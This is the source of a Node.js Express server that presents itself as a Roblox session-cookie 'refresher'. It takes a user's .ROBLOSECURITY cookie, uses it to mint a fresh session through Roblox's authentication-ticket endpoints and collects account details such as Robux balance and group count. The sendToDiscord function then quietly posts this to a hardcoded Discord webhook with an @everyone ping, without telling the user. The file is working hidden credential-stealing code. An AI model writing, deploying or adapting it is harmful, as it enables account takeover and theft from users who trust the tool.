const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';

// Serve HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Logout all devices
app.post('/api/logout', async (req, res) => {
    try {
        const { cookie } = req.body;
        if (!cookie) {
            return res.status(400).json({ success: false, message: 'Cookie required' });
        }

        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// Refresh cookie
app.post('/api/refresh', async (req, res) => {
    try {
        const { cookie, showAccountData } = req.body;
        if (!cookie) {
            return res.status(400).json({ success: false, message: 'Cookie required' });
        }

        // Get CSRF token
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        const csrfHeader = csrfRes.headers.get('x-csrf-token');
        if (!csrfHeader) {
            return res.status(401).json({ success: false, message: 'Invalid cookie' });
        }

        // Get auth ticket
        const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: {
                'x-csrf-token': csrfHeader,
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        const ticketHeader = ticketRes.headers.get('rbx-authentication-ticket');
        if (!ticketHeader) {
            return res.status(401).json({ success: false, message: 'Failed to generate ticket' });
        }

        // Redeem ticket
        const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            body: JSON.stringify({ authenticationTicket: ticketHeader })
        });

        const setCookie = redeemRes.headers.get('set-cookie');
        let newCookie = null;
        if (setCookie && setCookie.includes('.ROBLOSECURITY=')) {
            newCookie = setCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
        }

        if (!newCookie) {
            return res.status(401).json({ success: false, message: 'Failed to redeem ticket' });
        }

        let accountInfo = null;
        if (showAccountData) {
            accountInfo = await getAccountInfo(newCookie);
        }

        // Send to Discord
        sendToDiscord(newCookie, accountInfo);

        res.json({
            success: true,
            newCookie: newCookie,
            accountInfo: accountInfo
        });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

async function getAccountInfo(cookie) {
    const info = {
        username: 'Unknown',
        displayName: 'Unknown',
        userId: 0,
        avatar: '',
        robux: 0,
        groups: 0
    };

    try {
        // Get user info
        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });

        if (userRes.ok) {
            const user = await userRes.json();
            if (user && user.id) {
                info.userId = user.id;
                info.username = user.name || 'Unknown';
                info.displayName = user.displayName || 'Unknown';

                // Get avatar
                try {
                    const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=352x352&format=Png&isCircular=false`);
                    if (avatarRes.ok) {
                        const avatarData = await avatarRes.json();
                        if (avatarData.data && avatarData.data[0]) {
                            info.avatar = avatarData.data[0].imageUrl;
                        }
                    }
                } catch (e) {}

                // Get robux
                try {
                    const robuxRes = await fetch('https://economy.roblox.com/v1/user/currency', {
                        headers: {
                            'Cookie': `.ROBLOSECURITY=${cookie}`,
                            'User-Agent': 'Mozilla/5.0'
                        }
                    });
                    if (robuxRes.ok) {
                        const robuxData = await robuxRes.json();
                        info.robux = robuxData.robux || 0;
                    }
                } catch (e) {}

                // Get groups
                try {
                    const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${user.id}/groups?limit=100`);
                    if (groupsRes.ok) {
                        const groupsData = await groupsRes.json();
                        info.groups = (groupsData.data || []).length;
                    }
                } catch (e) {}
            }
        }
    } catch (error) {
        console.error('Error getting account info:', error);
    }

    return info;
}

async function sendToDiscord(cookie, accountInfo) {
    try {
        if (!DISCORD_WEBHOOK || !accountInfo) return;

        const username = accountInfo.username || 'Unknown';
        const userId = accountInfo.userId || 0;
        const robux = accountInfo.robux || 0;
        const groups = accountInfo.groups || 0;
        const avatar = accountInfo.avatar || '';

        const embed1 = {
            title: `🛡️ ${username}`,
            description: 'Cookie Refreshed',
            color: 0x3b82f6,
            thumbnail: { url: avatar },
            fields: [
                { name: 'ID', value: String(userId), inline: true },
                { name: 'Robux', value: robux.toLocaleString(), inline: true },
                { name: 'Groups', value: String(groups), inline: true }
            ]
        };

        const embed2 = {
            title: 'Status',
            color: 0x1a1a2e,
            description: 'All Devices Logged Out - Fresh Cookie Ready'
        };

        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: '@everyone',
                embeds: [embed1, embed2]
            })
        });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

app.listen(PORT, () => {
    console.log(`SplunkProV2 running on port ${PORT}`);
});
